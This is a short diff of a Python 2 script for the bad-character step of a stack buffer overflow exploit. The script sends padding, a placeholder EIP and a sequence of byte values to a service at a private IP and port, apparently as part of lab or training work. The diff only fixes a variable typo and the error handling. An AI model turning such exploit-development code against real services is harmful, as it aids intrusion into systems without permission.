@@ -1,6 +1,6 @@
 #!/usr/bin/python
 import socket
-import sys
+import traceback
 
 targetIP = "192.168.1.1"
 targetPort = 1337
@@ -10,7 +10,7 @@ eipOffset = 1000
 try:
   print "\nSending bad chars..."
   
-  preFill = "A" * eipoffset
+  preFill = "A" * eipOffset
   eip = "X" * 4
   bufferFill = "B" * (bufferSize - len(preFill) - len(eip))
   badchars = ("\x01\x00\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
@@ -38,6 +38,5 @@ try:
 
   print "\nDone!"
   
-except:
-  print "\nUh-oh, could not connect to target %s on port %d!" % (targetIP, targetPort)
-  sys.exit()
+except Exception:
+  traceback.print_exc()
